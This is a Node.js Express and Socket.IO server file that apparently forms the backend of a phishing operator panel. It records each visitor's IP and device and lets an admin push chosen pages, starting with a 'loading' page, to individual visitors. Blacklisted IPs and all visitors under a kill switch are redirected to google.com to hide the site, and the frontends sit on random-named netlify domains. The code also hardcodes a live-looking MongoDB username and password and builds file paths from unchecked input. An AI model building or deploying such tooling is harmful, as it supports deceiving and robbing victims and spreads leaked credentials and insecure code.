const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs').promises;

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: [
      "https://akjsdlaksjdklasd.netlify.app",    
      "https://askhdalsdhalshdahds.netlify.app",
      "http://localhost:3000"
    ],
    methods: ["GET", "POST"],
    credentials: true,
    allowedHeaders: ["*"]
  }
});
// Global settings
const redirectUrl = 'https://google.com';
let websiteEnabled = true;
let defaultPage = 'loading';

// Track connected IPs and their sessions
const connectedIPs = new Map();

app.use(cors({
  origin: [
    "https://akjsdlaksjdklasd.netlify.app",
    "https://askhdalsdhalshdahds.netlify.app",
    "http://localhost:3000"
  ],
  credentials: true,
  allowedHeaders: ["*"]
}));

// Serve static files from the pages directory
app.use('/pages', express.static(path.join(__dirname, 'pages')));

// Page content endpoint
app.get('/api/page-content/:page', async (req, res) => {
  try {
    const { page } = req.params;
    const filePath = path.join(__dirname, 'pages', `${page}.html`);
    const content = await fs.readFile(filePath, 'utf8');
    res.json({ content });
  } catch (error) {
    console.error('Error reading page content:', error);
    res.status(404).json({ error: 'Page not found' });
  }
});

// IP Helper function
const getClientIP = (socket) => {
  let ip = socket.handshake.headers['x-forwarded-for'] || 
           socket.handshake.address || 
           socket.client.conn.remoteAddress;
  
  if (ip.substr(0, 7) == "::ffff:") {
    ip = ip.substr(7);
  }
  return ip;
};

// MongoDB Schemas
const SessionSchema = new mongoose.Schema({
  id: String,
  ip: String,
  device: String,
  currentPage: String,
  lastHeartbeat: Date,
  active: Boolean,
  notes: { type: String, default: '' },
  pinned: { type: Boolean, default: false }
});

const BlacklistSchema = new mongoose.Schema({
  ip: String,
  addedAt: Date,
  reason: { type: String, default: '' }
});

const Session = mongoose.model('Session', SessionSchema);
const Blacklist = mongoose.model('Blacklist', BlacklistSchema);

// Middleware to check website state and IP blacklist
app.use(async (req, res, next) => {
  if (req.path.startsWith('/admin') || req.path.startsWith('/api/page-content')) {
    return next();
  }

  if (!websiteEnabled) {
    return res.redirect(redirectUrl);
  }

  const clientIP = req.ip;
  const isBlacklisted = await Blacklist.findOne({ ip: clientIP });
  if (isBlacklisted) {
    return res.redirect(redirectUrl);
  }

  next();
});

// Socket.IO connection handling
io.on('connection', async (socket) => {
  console.log('New connection:', socket.id);

  // Admin panel connection
  socket.on('admin-connect', async () => {
    console.log('Admin connected:', socket.id);
    const sessions = await Session.find({});
    const blacklist = await Blacklist.find({}).sort({ addedAt: -1 });
    socket.emit('session-update', sessions);
    socket.emit('blacklist-update', blacklist);
  });

  // Get banned users
  socket.on('get-banned-users', async () => {
    const bannedUsers = await Blacklist.find({}).sort({ addedAt: -1 });
    socket.emit('banned-users-update', bannedUsers);
  });

  // User connection handling
  socket.on('user-connect', async (userData) => {
    console.log('User connection attempt:', { id: socket.id, ...userData });

    if (!websiteEnabled) {
      socket.emit('force-redirect', redirectUrl);
      socket.disconnect();
      return;
    }

    const isBlacklisted = await Blacklist.findOne({ ip: userData.ip });
    if (isBlacklisted) {
      socket.emit('force-redirect', redirectUrl);
      socket.disconnect();
      return;
    }

    // Handle existing session for this IP
    const existingSocketId = connectedIPs.get(userData.ip);
    if (existingSocketId && existingSocketId !== socket.id) {
      console.log('Existing session found:', existingSocketId);
      const existingSocket = io.sockets.sockets.get(existingSocketId);
      if (existingSocket) {
        existingSocket.disconnect();
      }
      await Session.findOneAndUpdate(
        { id: existingSocketId },
        { active: false }
      );
    }

    connectedIPs.set(userData.ip, socket.id);

    try {
      // Delete any existing inactive sessions for this IP
      await Session.deleteMany({
        ip: userData.ip,
        active: false
      });

      // Create new session
      const session = new Session({
        id: socket.id,
        ip: userData.ip,
        device: userData.device,
        currentPage: defaultPage,
        lastHeartbeat: Date.now(),
        active: true,
        notes: '',
        pinned: false
      });
      await session.save();
      
      console.log('New session created:', {
        id: socket.id,
        ip: userData.ip
      });

      const sessions = await Session.find({});
      io.emit('session-update', sessions);
    } catch (error) {
      console.error('Error creating session:', error);
    }
  });

  // Heartbeat handling
  socket.on('heartbeat', async () => {
    const session = await Session.findOne({ id: socket.id });
    if (!session) return;

    // Verify this is the current active session for this IP
    if (connectedIPs.get(session.ip) === socket.id) {
      const isBlacklisted = await Blacklist.findOne({ ip: session.ip });
      if (isBlacklisted) {
        socket.emit('force-redirect', redirectUrl);
        socket.disconnect();
        return;
      }

      await Session.findOneAndUpdate(
        { id: socket.id },
        { 
          lastHeartbeat: Date.now(),
          active: true
        }
      );

      const sessions = await Session.find({});
      io.emit('session-update', sessions);
    } else {
      socket.disconnect();
    }
  });

  // Page change handling
  socket.on('change-page', async ({ sessionId, page }) => {
    const session = await Session.findOneAndUpdate(
      { id: sessionId },
      { currentPage: page }
    );
    
    if (session) {
      io.to(sessionId).emit('page-change', page);
      const sessions = await Session.find({});
      io.emit('session-update', sessions);
    }
  });

  // Default page change
  socket.on('set-default-page', (page) => {
    defaultPage = page;
    console.log('Default page set to:', page);
  });

  // Session deletion
  socket.on('delete-session', async (sessionId) => {
    const session = await Session.findOne({ id: sessionId });
    if (session) {
      if (connectedIPs.get(session.ip) === sessionId) {
        connectedIPs.delete(session.ip);
      }
      await Session.findOneAndDelete({ id: sessionId });
      io.to(sessionId).emit('force-redirect', redirectUrl);
      const targetSocket = io.sockets.sockets.get(sessionId);
      if (targetSocket) {
        targetSocket.disconnect();
      }
    }
    const sessions = await Session.find({});
    io.emit('session-update', sessions);
  });

  // Website state toggle
  socket.on('website-state', async ({ enabled }) => {
    websiteEnabled = enabled;
    console.log('Website state changed:', enabled);
    io.emit('website-state-changed', { enabled });
    
    if (!enabled) {
      const sessions = await Session.find({ active: true });
      for (const session of sessions) {
        if (session.id !== socket.id) {
          io.to(session.id).emit('force-redirect', redirectUrl);
          const targetSocket = io.sockets.sockets.get(session.id);
          if (targetSocket) {
            targetSocket.disconnect();
          }
          connectedIPs.delete(session.ip);
        }
      }
      await Session.updateMany(
        { id: { $ne: socket.id } },
        { active: false }
      );
    }
  });

  // Update session notes
  socket.on('update-session-note', async ({ sessionId, note }) => {
    await Session.findOneAndUpdate(
      { id: sessionId },
      { notes: note }
    );
    const sessions = await Session.find({});
    io.emit('session-update', sessions);
  });

  // Toggle session pin
  socket.on('toggle-session-pin', async (sessionId) => {
    const session = await Session.findOne({ id: sessionId });
    if (session) {
      await Session.findOneAndUpdate(
        { id: sessionId },
        { pinned: !session.pinned }
      );
      const sessions = await Session.find({});
      io.emit('session-update', sessions);
    }
  });

  // IP blacklist management
  socket.on('update-blacklist', async ({ ip, action, reason = '' }) => {
    if (action === 'add') {
      const blacklist = new Blacklist({
        ip,
        addedAt: new Date(),
        reason
      });
      await blacklist.save();

      const sessions = await Session.find({ ip });
      for (const session of sessions) {
        io.to(session.id).emit('force-redirect', redirectUrl);
        const targetSocket = io.sockets.sockets.get(session.id);
        if (targetSocket) {
          targetSocket.disconnect();
        }
      }

      connectedIPs.delete(ip);
      await Session.updateMany({ ip }, { active: false });
    } else {
      await Blacklist.findOneAndDelete({ ip });
    }

    const blacklisted = await Blacklist.find({}).sort({ addedAt: -1 });
    const sessions = await Session.find({});
    io.emit('blacklist-update', blacklisted);
    io.emit('session-update', sessions);
  });

  // Disconnect handling
  socket.on('disconnect', async () => {
    const session = await Session.findOne({ id: socket.id });
    if (session) {
      console.log('Session disconnected:', socket.id);
      if (connectedIPs.get(session.ip) === socket.id) {
        connectedIPs.delete(session.ip);
      }
      await Session.findOneAndUpdate(
        { id: socket.id },
        { active: false }
      );
      const sessions = await Session.find({});
      io.emit('session-update', sessions);
    }
  });
});

// Clean up inactive sessions periodically
setInterval(async () => {
  const fiveMinutesAgo = new Date(Date.now() - 5 * 60 * 1000);
  const deletedSessions = await Session.deleteMany({
    active: false,
    pinned: false,
    lastHeartbeat: { $lt: fiveMinutesAgo }
  });
  if (deletedSessions.deletedCount > 0) {
    console.log(`Cleaned up ${deletedSessions.deletedCount} inactive sessions`);
  }
}, 5 * 60 * 1000);

// MongoDB connection
mongoose.connect('mongodb+srv://sophisticated64:9d8mEyqRdr3PaF8y@cluster0.tedtu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0')
  .then(() => {
    console.log('Connected to MongoDB');
    server.listen(3001, '0.0.0.0', () => {  // Listen on all network interfaces
      console.log('Server running on port 3001');
    });
  })
  .catch((error) => {
    console.error('MongoDB connection error:', error);
  });